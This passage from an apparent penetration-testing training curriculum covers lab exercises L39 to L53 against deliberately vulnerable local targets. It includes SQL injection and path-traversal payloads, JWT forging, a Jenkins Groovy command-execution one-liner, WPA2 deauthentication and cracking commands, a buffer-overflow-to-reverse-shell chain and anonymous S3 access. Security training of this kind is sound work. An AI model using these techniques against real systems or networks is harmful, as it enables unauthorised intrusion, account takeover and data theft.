4. Hours 10-24 (Exploitation): attempt to exploit at least one confirmed vulnerability to establish a foothold, screenshotting/logging each step (command, response, resulting access level)
5. Hours 24-32 (Post-exploitation/privesc): enumerate for privilege escalation (SUID binaries, misconfigured services, credential reuse), cross-checking any binary-based technique against GTFOBins, and document the full path to higher privilege
6. Hours 32-36 (Impact, only if explicitly in scope): note any additional hosts/data reachable from the foothold without exceeding the agreed ROE
7. Hours 36-44 (Reporting): assign a CVSS score to every finding and write the report with a standard structure — Executive Summary, Scope, Methodology, Detailed Findings (CVSS + evidence + remediation), Overall Risk Rating, Strategic Recommendations
8. Hours 44-48 (QA + delivery): proofread the Executive Summary for a non-technical reader, confirm every finding has reproduction steps and a fix, then submit the final report as the programme's closing deliverable
9. Start from a real report skeleton rather than a blank page — professional pentest reports follow near-identical section ordering across the industry (see resources)

**Resources:**

- [PTES Technical Guidelines (maintained mirror; pentest-standard.org is currently unreachable)](https://pentest-standard.readthedocs.io/en/latest/) _(link)_
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_
- [TCM Security: sample pentest report](https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report) _(link)_
- [Nessus Essentials (free)](https://www.tenable.com/products/nessus/nessus-essentials) _(tool)_
- [Hack The Box – Starting Point (self-directed target option)](https://app.hackthebox.com/starting-point) _(platform)_
- [PTES (Penetration Testing Execution Standard)](http://www.pentest-standard.org) _(link)_
- [NIST SP 800-61: Computer Security Incident Handling Guide](https://csrc.nist.gov/pubs/sp/800/61/r2/final) _(link)_

---

## L39: WebGoat: SQL Injection & Path Traversal

**Week 9** · Module `m9` · WebGoat · medium

WebGoat is OWASP's own official training platform, and its Injection Flaws lessons are the same drills used to teach SQL injection and path traversal before a developer ever touches a real codebase. You register your own account inside WebGoat itself — no shared credentials, no external platform — then work through the SQL Injection lesson set, from spotting a raw string-concatenated query to bypassing a login with a classic ' OR '1'='1 payload, before moving to the Path Traversal lesson, where an unsanitized filename parameter lets you walk out of an intended directory using ../ sequences. Because WebGoat only unlocks a green checkmark once you've supplied the actual working payload, not just read the answer, you leave with the muscle memory for spotting and exploiting both flaw classes in a real codebase.

**Docker:** `docker run -d -p 18080:8080 webgoat/webgoat`

**Completion evidence:** WebGoat's own lesson tracker showing a green 'Solved' indicator on the String SQL Injection, Numeric SQL Injection, and Path Traversal exercises.

**Instructions:**

1. Click 'Start Lab' above to launch WebGoat in Docker, then browse to http://localhost:18080/WebGoat -- the bare root returns nothing, WebGoat lives under the /WebGoat path
2. Register your own account directly inside WebGoat (Sign up link) -- no external platform or shared credentials needed
3. Open the 'Injection Flaws' lesson category from the left menu and work through the SQL Injection subsection in order
4. Complete the 'String SQL Injection' exercise by supplying a payload that returns rows the query wasn't meant to return
5. Complete the 'Numeric SQL Injection' and 'Log Spoofing' exercises in the same subsection
6. Bypass a login form using a classic ' OR '1'='1 style payload in the dedicated login-bypass exercise
7. Move to the 'Path Traversal' lesson, identify the vulnerable filename parameter, and escalate with ../ sequences until you read a file outside the intended directory
8. Screenshot each lesson's green 'Solved' indicator as you complete it

**Resources:**

- [WebGoat (GitHub)](https://github.com/WebGoat/WebGoat) _(tool)_
- [OWASP WebGoat project page](https://owasp.org/www-project-webgoat/) _(link)_
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) _(link)_
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) _(link)_

---

## L40: WebGoat: Broken Access Control & JWT

**Week 11** · Module `m11` · WebGoat · medium

Once an application starts trusting a token instead of a session cookie, every JWT-handling mistake becomes a direct path to impersonating another user -- WebGoat's JSON Web Token lessons walk through exactly that failure mode. You'll exploit a JWT signed with a weak, guessable secret by brute-forcing it offline, then forge a token claiming to be a different user and use it to reach data that user's role shouldn't expose. The lab pairs this with WebGoat's Broken Access Control lessons, where a purely client-side authorization check and an insecure direct object reference both let you reach another user's data by editing a request the server should have validated itself. You leave able to name the exact missing server-side check behind both bugs.

**Docker:** `docker run -d -p 18080:8080 webgoat/webgoat`

**Completion evidence:** WebGoat's lesson tracker showing green 'Solved' on the JWT secret-cracking exercise, the Insecure Direct Object References exercise, and the Client-Side Filtering exercise.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/WebGoat/login and log in with the account from the SQL Injection lab (or register a new one)
2. Open the 'JSON Web Tokens' lesson category and identify why the exercise's provided token's signing secret is crackable offline
3. Brute-force the weak JWT signing secret with a wordlist and a tool such as hashcat or jwt_tool, then use the recovered secret to forge a token for a different user
4. Use the forged token to access the exercise's protected endpoint as that other user
5. Open the 'Insecure Direct Object References' lesson and change a request parameter (e.g. a numeric ID) to view another user's data the server should have blocked
6. Open the 'Client-Side Filtering' exercise inside Broken Access Control and bypass a check that only exists in the browser, never on the server
7. For each exercise, write one sentence naming the exact server-side check that was missing

**Resources:**

- [WebGoat (GitHub)](https://github.com/WebGoat/WebGoat) _(tool)_
- [jwt.io — JWT decoder](https://jwt.io) _(tool)_
- [jwt_tool (GitHub)](https://github.com/ticarpi/jwt_tool) _(tool)_
- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) _(link)_
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) _(link)_

---

## L41: bWAPP: same bug, two filter strengths

**Week 9** · Module `m9` · bWAPP · easy

bWAPP deliberately bundles over 100 web vulnerabilities behind one login screen, categorized by OWASP class, so you can drill a specific vuln type on demand instead of hunting for the right target. After the one-time install step every fresh bWAPP deployment needs, you'll use its own security-level slider (low/medium/high) across three categories -- SQL Injection, Stored XSS, and OS Command Injection -- first solving each at 'low' to confirm the mechanic, then re-attempting the exact same bug at 'medium' to see what a real, partial input filter actually blocks and what it misses. That comparison, same bug, same payload family, different filter strength, is what separates 'I found XSS once' from understanding why a filter catches one variant and not another.

**Docker:** `docker run -d -p 18080:80 raesene/bwapp`

**Completion evidence:** Screenshot showing a successful exploit at security level 'low' and the same attack re-run at 'medium', for all three categories (SQLi, Stored XSS, OS Command Injection), with a note on what the medium filter changed.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/install.php once and click the button to install bWAPP's database -- a one-time step every fresh bWAPP container needs
2. Log in with bWAPP's documented default credentials: bee / bug
3. Set the security level slider (top right) to 'low' and select 'SQL Injection (GET/Search)'; confirm you can extract data with a UNION-based payload
4. Re-run the identical attack at security level 'medium' and note exactly what changed in the app's behavior or filtering
5. Repeat the same low-then-medium comparison for 'HTML Injection - Stored (Blog)' (stored XSS)
6. Repeat the same low-then-medium comparison for 'OS Command Injection'
7. For each of the 3 categories, write one sentence on what the medium filter blocked and whether you found a bypass

**Resources:**

- [bWAPP official page (itsecgames.com)](http://www.itsecgames.com) _(link)_
- [bWAPP on Docker Hub](https://hub.docker.com/r/raesene/bwapp) _(tool)_
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) _(link)_

---

## L42: Mutillidae II: LFI via Burp, hints on then off

**Week 10** · Module `m10` · Mutillidae · medium

Mutillidae II ships its own built-in hint system and a security-level toggle, making it the target most commonly paired with Burp Suite in OWASP training because it forces you to intercept and rewrite requests instead of relying on obvious browser-visible forms. You'll drive it through Burp's proxy to solve its Local File Inclusion challenge, then repeat the exercise with hints fully disabled to confirm you can still identify the vulnerable parameter and traversal payload on your own. Pairing the same LFI/RFI skill against a differently-built target than DVWA's own File Inclusion module is what proves the skill generalized, rather than that you memorized DVWA's specific parameter name.

**Docker:** `docker run -d -p 18080:80 citizenstig/nowasp`

**Completion evidence:** Burp Repeater screenshot showing the successful LFI request/response against the vulnerable 'page' parameter, captured both with hints enabled and with the security level reset to hints-off.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/set-up-database.php once and click the setup button (Mutillidae's own one-time database initialization)
2. Configure Burp Suite (or your browser) to proxy through 127.0.0.1:8080 and confirm you can see Mutillidae's traffic in Burp's HTTP history
3. From the menu, open OWASP 2013 -> A1 - Injection (Other) -> Local File Inclusion, with hints enabled, and identify the vulnerable 'page' parameter
4. Use Burp Repeater to modify the request's page parameter with a ../ traversal payload until you read a file outside the intended webroot
5. Reset the security level to '0' (hints fully off, via the Toggle Hints / Security Level menu) and re-solve the exact same LFI challenge without any hint text visible
6. Compare your solve process with hints on vs off, and write 2-3 sentences on what you relied on the hints for the first time

**Resources:**

- [OWASP Mutillidae II (GitHub)](https://github.com/webpwnized/mutillidae) _(tool)_
- [Mutillidae user guide](https://github.com/webpwnized/mutillidae/wiki) _(link)_
- [Burp Suite documentation](https://portswigger.net/burp/documentation) _(link)_

---

## L43: DSVW: 45-minute vulnerability speed round

**Week 10** · Module `m10` · DSVW · medium

Damn Small Vulnerable Web packs roughly 50 distinct vulnerabilities into a single Python file small enough to read end to end in one sitting, and this lab uses that density deliberately: instead of one deep dive, you work through its listed vulnerability categories as a timed scavenger hunt, solving as many as you can inside a set window. Because every category lives one click away from the last, the constraint here isn't finding the bug — it's recognizing which OWASP class you're looking at fast enough to pick the right technique on the first try, the same speed real CTF scoring and time-boxed engagements reward. A final tally of categories solved versus attempted is the artifact that matters, not a single polished write-up.

**Docker:** `docker run -d -p 18080:8000 appsecco/dsvw`

**Completion evidence:** A written tally of categories attempted vs solved within the 45-minute window, with the working payload noted for each solved category.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/ to see DSVW's full list of vulnerability categories on the landing page
2. Set a 45-minute timer before you open the first category
3. Work through as many listed categories as you can (SQL Injection, XSS, Command Injection, XXE, SSRF, LFI, and others DSVW lists) -- for each one you attempt, note whether you solved it or got stuck
4. For every category you solve, write the one-line payload or technique that worked
5. When the timer ends, tally solved vs attempted and pick the single category that took longest -- write 2-3 sentences on what made it harder than the rest

**Resources:**

- [DSVW (GitHub)](https://github.com/appsecco/dsvw) _(tool)_
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) _(link)_

---

## L44: VAmPI: REST API security, no browser UI to lean on

**Week 9** · Module `m9` · VAmPI · medium

Every OWASP API Top 10 category -- broken object-level authorization, mass assignment, excessive data exposure -- needs a real JSON API to practice against, and VAmPI is built specifically as that target: a small, intentionally vulnerable Flask REST API with no browser UI to distract from the requests themselves. Working entirely through Burp or curl, you'll register a user, then use another user's numeric ID to pull their data through a broken object-level authorization flaw, exploit a mass-assignment bug by adding a field the API was never supposed to accept from a client, and inspect the API's own JWT for a signing weakness. This is deliberately the first lab in the program where there's no page to click through -- every finding comes from reading and rewriting a raw HTTP request.

**Docker:** `docker run -d -p 18080:5000 erev0s/vampi`

**Completion evidence:** Burp or curl request/response pairs showing the successful Broken Object Level Authorization request (another user's data returned) and the successful mass-assignment request, each mapped to its OWASP API Top 10 category.

**Instructions:**

1. Click 'Start Lab' above, then confirm the API is reachable: browse to http://localhost:18080/ and confirm you get a JSON welcome response, not a webpage
2. Review the API's own documentation endpoint (VAmPI ships a Swagger/OpenAPI spec) to see every available route before testing
3. Register two separate users via the /users/v1/register endpoint and log in as the first one to get a JWT
4. Exploit Broken Object Level Authorization: as user 1, request user 2's profile data by username at the /users/v1/<username> endpoint and confirm you receive data you shouldn't be able to see
5. Exploit Mass Assignment: find the user-update endpoint and add an unexpected field (e.g. an admin flag) to your update request body, then check whether the API accepted and stored it
6. Decode your own JWT at jwt.io and note its signing algorithm and claims
7. Write a short report: which OWASP API Top 10 category each of your 2 findings maps to, and the exact request that triggered each

**Resources:**

- [VAmPI (GitHub)](https://github.com/erev0s/VAmPI) _(tool)_
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/) _(link)_
- [jwt.io — JWT decoder](https://jwt.io) _(tool)_

---

## L45: Grafana: exploit a real, disclosed CVE (CVE-2021-43798)

**Week 11** · Module `m11` · Grafana · hard

CVE-2021-43798 is a real, publicly disclosed Grafana vulnerability -- an unauthenticated path-traversal flaw in how versions 8.0.0-beta1 through 8.3.0 served a plugin's static assets, letting anyone read arbitrary files off the host filesystem without logging in. This lab has you confirm the exact version running, then research the public advisory and a proof-of-concept yourself and adapt it against your own local, disposable copy of that exact vulnerable version -- the same research-to-exploit workflow a real engagement runs against any newly disclosed CVE, rather than a payload handed to you pre-solved. Once you've confirmed unauthenticated file read, you pivot to Grafana's own default admin/admin credentials to compare what an authenticated attacker can additionally reach.

**Docker:** `docker run -d -p 18080:3000 grafana/grafana:8.3.0`

**Completion evidence:** Terminal or Burp screenshot showing the confirmed vulnerable version (8.3.0) and an unauthenticated request that successfully reads a file outside the intended plugin directory.

**Instructions:**

1. Click 'Start Lab' above, then confirm the exact version via http://localhost:18080/api/health -- it must report version 8.3.0, the last vulnerable release before 8.3.1 patched this CVE
2. Research CVE-2021-43798 from its official NVD/Grafana advisory and at least one public proof-of-concept write-up
3. List the plugins installed on your instance via GET http://localhost:18080/api/plugins
4. Adapt the documented path-traversal technique against one installed plugin's /public/plugins/<plugin-id>/ path to read a file outside the intended directory, entirely unauthenticated
5. Once confirmed, log in normally with Grafana's default credentials (admin/admin) and note what an authenticated attacker can additionally do (data source configs, saved dashboards) that the unauthenticated file-read alone could not reach
6. Write a short finding: the exact vulnerable version, the unauthenticated impact, and why patching to 8.3.1+ closes it

**Resources:**

- [NVD: CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) _(link)_
- [Grafana security advisory (GitHub)](https://github.com/grafana/grafana/security/advisories/GHSA-69j6-29vr-p3j9) _(link)_
- [Grafana releases (GitHub)](https://github.com/grafana/grafana/releases) _(link)_

---

## L46: Jenkins: setup exposure to Groovy Script Console RCE

**Week 11** · Module `m11` · Jenkins · hard

An exposed Jenkins instance is one of the most consistently valuable footholds in real internal-network engagements, because its Script Console -- when reachable -- runs arbitrary Groovy with the same privileges as the Jenkins service account, often meaning full host code execution the moment you're authenticated. This lab starts you exactly where a real assessment does: enumerating a freshly-deployed Jenkins instance's setup-wizard exposure, retrieving the auto-generated initial admin password the way an assessor with local access to the host would, and finishing the setup wizard yourself. Once inside, you reach Manage Jenkins -> Script Console and confirm you can execute an arbitrary Groovy one-liner -- the same technique that turns 'we found a Jenkins box' into 'we have code execution on it.'

**Docker:** `docker run -d -p 18080:8080 jenkins/jenkins:lts`

**Completion evidence:** Script Console screenshot showing a Groovy one-liner (e.g. println "id".execute().text) executed with real OS command output returned.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/login and confirm Jenkins is running its first-time setup wizard
2. On your own machine (with Docker installed), retrieve the auto-generated initial admin password by running: docker logs technieum-lab-l46 and copying the password Jenkins printed during startup
3. Paste that password into the setup wizard, choose 'Install suggested plugins,' and create your own admin user to finish setup
4. Log in as your new admin user and navigate to Manage Jenkins -> Script Console
5. Run a simple Groovy one-liner (e.g. println "id".execute().text) and confirm it returns real output from the underlying OS
6. Write 2-3 sentences on why an exposed, unauthenticated Script Console is equivalent to full remote code execution on the host running Jenkins

**Resources:**

- [Jenkins on Docker Hub](https://hub.docker.com/r/jenkins/jenkins) _(tool)_
- [Jenkins Script Console documentation](https://www.jenkins.io/doc/book/managing/script-console/) _(link)_
- [Jenkins security advisories](https://www.jenkins.io/security/advisories/) _(link)_

---

## L47: Juice Shop: Injection & XSS challenge track

**Week 9** · Module `m9` · Juice Shop · medium

OWASP Juice Shop scores every one of its built-in challenges by real vulnerability class, and this lab works a second, distinct slice of that challenge board from the session-cookie lab earlier in the program: its Injection and XSS tracks. You'll solve Juice Shop's login-bypass SQL injection challenge against its login form, then its DOM XSS challenge by getting a payload to execute purely client-side, and finally its persisted XSS challenge by getting a stored payload to fire for a different, later visitor. Juice Shop's own scoreboard confirms each solve in real time, so this lab is graded the same way the app grades itself.

**Docker:** `docker run -d -p 18080:3000 bkimminich/juice-shop`

**Completion evidence:** Score board screenshot showing the 'Login Admin' (SQLi), DOM XSS, and Tier 2 (persisted XSS) challenges all marked solved.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/ and open the hidden score board at /#/score-board -- intentionally undocumented in the UI, finding it is the app's first challenge
2. Solve the 'Login Admin' challenge: use SQL injection against the login form to authenticate as the admin account without knowing its password
3. Solve the 'DOM XSS' challenge by getting a payload to execute entirely in the browser via a client-side sink, with no server round-trip
4. Solve the 'XSS Tier 2' (persisted/stored XSS) challenge by getting your payload to fire when a different, later page load renders the stored data
5. For each of the 3 solves, note in the score board which OWASP category Juice Shop itself tags the challenge with
6. Screenshot the score board showing all 3 challenges marked solved

**Resources:**

- [OWASP Juice Shop (GitHub)](https://github.com/juice-shop/juice-shop) _(tool)_
- [Juice Shop official challenge solutions](https://pwning.owasp-juice.shop/) _(link)_
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) _(link)_

---

## L48: Juice Shop: Business Logic & Access Control challenge track

**Week 10** · Module `m10` · Juice Shop · medium

Juice Shop's Broken Access Control and business-logic challenges are deliberately not injection bugs at all -- they're cases where the application logic itself makes a wrong assumption, the failure mode OWASP ranks as the single most common web vulnerability class. You'll solve its Forged Coupon challenge by reverse-engineering how a real discount code is generated rather than guessing one, its basket-manipulation challenge by editing another user's shopping basket via a request parameter the server should have validated against your own session, and its Five-Star Feedback challenge by manipulating a rating field the client wasn't supposed to be able to set that high. None of these three needs SQL injection or XSS -- they need you to notice where the server trusted a client-supplied value it shouldn't have.

**Docker:** `docker run -d -p 18080:3000 bkimminich/juice-shop`

**Completion evidence:** Score board screenshot showing the Forged Coupon, basket-manipulation, and Five-Star Feedback challenges all marked solved, with the request that triggered each.

**Instructions:**

1. Click 'Start Lab' above, then browse to http://localhost:18080/ and log back into the account you used (or create a new one) for this lab
2. Solve the 'Forged Coupon' challenge: reverse-engineer the pattern Juice Shop uses to generate its real discount codes rather than brute-forcing one
3. Solve the basket-manipulation challenge: intercept a request that includes a basket ID and change it to access a different user's shopping basket
4. Solve the 'Five-Star Feedback' challenge by submitting a product rating through a request parameter the UI itself doesn't expose, at a value the interface never allows
5. Open the score board and confirm all 3 are marked solved, noting which category (Broken Access Control vs. business logic) Juice Shop itself assigns each one
6. Write 2-3 sentences on what all three findings have in common: none of them used an injection payload

**Resources:**

- [OWASP Juice Shop (GitHub)](https://github.com/juice-shop/juice-shop) _(tool)_
- [Juice Shop official challenge solutions](https://pwning.owasp-juice.shop/) _(link)_
- [OWASP Top 10 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) _(link)_

---

## L49: TryHackMe: Windows PrivEsc room + your own SSH tunnel

**Week 14** · Module `m17` · TryHackMe · medium

Windows privilege escalation and pivoting are two separate skills that only become useful together: escalating to SYSTEM on a beachhead host is worthless if you can't then reach the internal network segment behind it. TryHackMe's 'Windows PrivEsc' room walks the full checklist this module covers — service misconfigs, unquoted paths, AlwaysInstallElevated, and token impersonation via a Potato-family exploit — against a real intentionally-misconfigured Windows VM. You then close the loop yourself: set up an SSH local port forward between two machines you control (a VM, a spare device, or a cloud instance) and confirm you can reach a service on the 'far' machine only through the tunnel, proving the mechanic before you ever need it live.

**Completion evidence:** TryHackMe room completion screenshot (green progress badge on the Windows PrivEsc room) plus a terminal screenshot showing a successful connection through your own SSH -L tunnel to a service that isn't directly reachable without it.

**Instructions:**

1. Deploy TryHackMe's "Windows PrivEsc" room and connect via the room's provided credentials/RDP
2. Run a manual enumeration pass first (services, scheduled tasks, registry autoruns) before reaching for an automated tool, to build the checklist from memory
3. Run WinPEAS or Seatbelt to cross-check your manual findings and confirm you didn't miss anything
4. Identify and exploit at least one privesc vector the room provides: an unquoted service path, a weak service ACL, AlwaysInstallElevated, or a SeImpersonatePrivilege token-impersonation exploit (PrintSpoofer/JuicyPotatoNG)
5. Confirm you reached SYSTEM with a screenshot of "whoami" showing nt authority\system
6. On two machines you control (e.g. two local VMs, or your host plus a VM), set up an SSH local port forward: ssh -L 8080:internal-service-host:80 user@jumpbox
7. Confirm the tunnel works by browsing to http://localhost:8080 on the machine that has no direct route to the internal service, and getting a real response back through the tunnel
8. Write 2-3 sentences connecting the two halves: what SYSTEM access on a beachhead host would let you additionally tunnel into on a real internal network

**Resources:**

- [TryHackMe: Windows PrivEsc](https://tryhackme.com/room/windowsprivesc20) _(platform)_
- [PayloadsAllTheThings — Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) _(link)_
- [HackTricks — Windows Local Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) _(link)_
- [OpenSSH port forwarding documentation](https://man.openbsd.org/ssh#L) _(link)_

---

## L50: Capture and crack a real WPA2 handshake

**Week 15** · Module `m19` · Aircrack-ng · medium

A WPA2 passphrase is only as strong as the wordlist and time available to crack it offline, and the only way to internalize that is to actually run the airmon-ng/airodump-ng/aireplay-ng workflow against a real access point end to end. On your own home network (the only network you're authorized to test this way), you'll enable monitor mode, capture a 4-way handshake by forcing a deauthentication and reassociation, then attempt an offline dictionary crack with aircrack-ng or hashcat. If you don't have a monitor-mode-and-injection-capable wireless adapter, aircrack-ng's own official tutorial ships a real sample handshake capture you can crack instead — the point is the cracking workflow, not where the capture came from.

**Completion evidence:** Terminal screenshot showing airodump-ng capturing a WPA handshake ('WPA handshake:' message) and a second screenshot showing aircrack-ng or hashcat successfully recovering the passphrase from that capture.

**Instructions:**

1. Confirm you're testing your own home network (or another network you own/are explicitly authorized to test) — this workflow only ever targets a network you have permission for
2. Enable monitor mode on a capable wireless adapter: sudo airmon-ng start wlan0
3. Identify your target AP's BSSID and channel: sudo airodump-ng wlan0mon
4. Start a focused capture on that BSSID/channel, writing to a file: sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
5. In a second terminal, send a handful of deauth frames to force a client to reassociate and produce a fresh handshake: sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
6. Confirm airodump-ng's header shows "WPA handshake:" once the reassociation is captured
7. If you don't have a monitor-mode-capable adapter, download aircrack-ng's own official tutorial sample capture instead and use that for the remaining steps
8. Attempt to crack the captured handshake with a wordlist: aircrack-ng -w wordlist.txt capture-01.cap
9. As a second method, convert the capture and try hashcat mode 22000: hcxpcapngtool -o capture.hc22000 capture-01.cap, then hashcat -m 22000 capture.hc22000 wordlist.txt
10. Write 2-3 sentences on why this is fundamentally a dictionary-attack problem (success depends entirely on the passphrase being in your wordlist) rather than a break of WPA2's cryptography itself

**Resources:**

- [Aircrack-ng official documentation](https://www.aircrack-ng.org/documentation.html) _(link)_
- [Aircrack-ng (GitHub)](https://github.com/aircrack-ng/aircrack-ng) _(tool)_
- [hashcat](https://hashcat.net/hashcat/) _(tool)_
- [hcxtools (GitHub)](https://github.com/ZerBea/hcxtools) _(tool)_

---

## L51: Write a professional report for your capstone engagement

**Week 16** · Module `m21` · Written Deliverable · medium

Every skill this programme built only counts once it survives being handed to someone who never saw you run a single command — which is exactly the test this lab applies to your own L38 capstone results. You'll CVSS-score each finding you produced (not just call it 'critical' by feel), write one real executive-summary paragraph aimed at a non-technical sponsor, and structure at least one finding through the full anatomy: title, score, affected asset, description, real evidence, exact reproduction steps, and remediation guidance specific enough for a developer to act on without asking you a follow-up question. This is the same deliverable a real engagement is judged by, built from your own real findings rather than a template.

**Completion evidence:** A written report document containing: an executive summary paragraph, a CVSS v3.1 vector string and score for each capstone finding, and at least one fully-structured technical finding with reproduction steps and remediation guidance.

**Instructions:**

1. Gather your findings from the L38 capstone simulation — every vulnerability, misconfiguration, or foothold you documented during that 48-hour window
2. For each finding, work out its CVSS v3.1 base score by walking through the metric groups (Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and the CIA impact triad) rather than assigning a severity by feel
3. Write one executive-summary paragraph aimed at a non-technical sponsor: business risk and impact, not technique or tool names
4. Pick your single highest-severity finding and write it up with the full anatomy: title, CVSS score, affected asset, plain-language description, real evidence (a screenshot or the actual request/response pair), exact numbered reproduction steps, and remediation guidance specific enough for a developer to act on directly
5. Re-read your own remediation guidance and check it isn't generic advice like "improve input validation" — rewrite it if it is
6. Assign a realistic remediation timeframe to that finding, tied to its severity
7. Proofread for over-technical language a non-technical reader wouldn't follow, and confirm every claim in the report has real evidence behind it

**Resources:**

- [FIRST.org CVSS v3.1 Specification](https://www.first.org/cvss/v3-1/specification-document) _(link)_
- [TCM Security sample pentest report](https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report) _(link)_
- [SANS Reading Room](https://www.sans.org/white-papers/) _(link)_

---

## L52: TryHackMe: Buffer Overflow Prep

**Week 15** · Module `m18` · TryHackMe · hard

The offset-crash-EIP-badchars-shellcode methodology this module teaches only sticks once you've run it against a real binary that actually crashes the way the theory predicts. TryHackMe's 'Buffer Overflow Prep' room provides exactly that: a real vulnerable Windows application and Immunity Debugger environment, walking the same sequence this module's topics cover in order — fuzz to find the crash, find the exact offset with a cyclic pattern, confirm EIP control, run the full bad-character sweep, locate a JMP ESP with no bad characters in it, then generate and land working shellcode. Completing it end to end is the practical proof that the methodology, not memorized steps against one specific binary, is what you actually walked away with.

**Completion evidence:** Screenshot of a working reverse shell obtained via the completed exploit chain (fuzz -> offset -> EIP control -> bad chars -> JMP ESP -> shellcode), plus a screenshot of Immunity Debugger showing EIP fully controlled by your marker bytes.

**Instructions:**

1. Deploy TryHackMe's "Buffer Overflow Prep" room and connect to the provided Windows VM via RDP
2. Attach Immunity Debugger (with the mona.py plugin configured) to the vulnerable application and confirm you can trigger a crash by sending a large, obviously-oversized input
3. Generate a cyclic pattern with msf-pattern_create (or pattern_create.rb) at a length comfortably past your crash length, send it, and read the crashed EIP value
4. Find the exact offset into your buffer that lands in EIP with msf-pattern_offset (or pattern_offset.rb)
5. Confirm EIP control precisely: send a buffer with your exact offset of junk bytes, then 4 distinct marker bytes, and confirm EIP shows exactly those 4 bytes
6. Run the full bad-character sweep: send the entire 0x00-0xFF byte range after your offset, then use !mona compare (or manual inspection of the stack dump) to find which bytes got mangled or truncated
7. Find a JMP ESP instruction with none of your bad characters in its address, from a loaded module with no memory protections, using !mona jmp -r esp -cpb "<your bad chars>"
8. Generate shellcode with msfvenom, excluding your confirmed bad characters, and place it after a small NOP sled following your JMP ESP address in the buffer
9. Set up a listener and send the final exploit; confirm you receive a working shell back

**Resources:**

- [TryHackMe: Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep) _(platform)_
- [corelan.be — Exploit Writing Tutorials](https://www.corelan.be) _(link)_
- [Metasploit Framework (GitHub)](https://github.com/rapid7/metasploit-framework) _(tool)_
- [mona.py (corelan-consulting)](https://github.com/corelan/mona) _(tool)_

---

## L53: LocalStack: AWS S3 Misconfiguration Walkthrough (Local)

**Week 16** · Module `m20` · LocalStack (Docker) · medium

LocalStack is a well-known, self-contained AWS emulator you run entirely in Docker -- it stands up local implementations of S3, EC2, and dozens of other AWS APIs behind the same edge port, with no real AWS account, billing, or internet-facing bucket involved. This lab has you start a LocalStack container, point the real AWS CLI at it with --endpoint-url, and then build the exact misconfiguration flAWS.cloud is famous for teaching: an S3 bucket with a public-read/public-list policy that lets anyone -- with zero credentials -- enumerate and download its contents. Because you create the misconfiguration yourself before exploiting it, you see both sides of the same bug that leaks real production data constantly: the one-line bucket policy that causes it, and the anonymous aws s3 ls / s3 cp --no-sign-request commands that exploit it.

**Docker:** `docker run -d -p 18080:4566 localstack/localstack`

**Completion evidence:** Terminal output showing the bucket policy JSON applied, then an anonymous `aws s3 ls s3://<bucket> --no-sign-request --endpoint-url http://localhost:18080` listing the bucket's contents and an anonymous `aws s3 cp` downloading a file from it, with no credentials configured for either command.

**Instructions:**

1. Click 'Start Lab' above to launch LocalStack -- the portal maps its edge port (4566, which serves every emulated AWS API) to http://localhost:18080
2. Configure the AWS CLI with dummy credentials LocalStack accepts by default: export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
3. Create a bucket against the local endpoint: aws --endpoint-url=http://localhost:18080 s3 mb s3://flaws-local
4. Upload a "secret" file to it: echo 'this should not be public' > secret.txt && aws --endpoint-url=http://localhost:18080 s3 cp secret.txt s3://flaws-local/secret.txt
5. Deliberately misconfigure the bucket with a public-read policy: save a policy.json granting {"Effect":"Allow","Principal":"*","Action":["s3:GetObject","s3:ListBucket"],"Resource":["arn:aws:s3:::flaws-local","arn:aws:s3:::flaws-local/*"]}, then apply it with aws --endpoint-url=http://localhost:18080 s3api put-bucket-policy --bucket flaws-local --policy file://policy.json
6. Confirm the misconfiguration anonymously, with no credentials configured at all: aws --endpoint-url=http://localhost:18080 s3 ls s3://flaws-local --no-sign-request
7. Exploit it: download the file anonymously with aws --endpoint-url=http://localhost:18080 s3 cp s3://flaws-local/secret.txt - --no-sign-request
8. Write one paragraph naming the exact misconfiguration (a bucket policy with Principal "*" granting s3:ListBucket/s3:GetObject) and the real-world fix (remove the public principal, or enable S3 Block Public Access)

**Resources:**

- [LocalStack documentation](https://docs.localstack.cloud/) _(link)_
- [AWS CLI documentation](https://docs.aws.amazon.com/cli/) _(link)_
- [AWS S3: Using bucket policies](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-policies.html) _(link)_
- [AWS S3: Blocking public access](https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html) _(link)_
- [flaws.cloud (optional extra practice)](http://flaws.cloud) _(platform)_

---

## L54: Command Injection on DVWA

**Week 9** · Module `m9` · DVWA (Docker) · medium

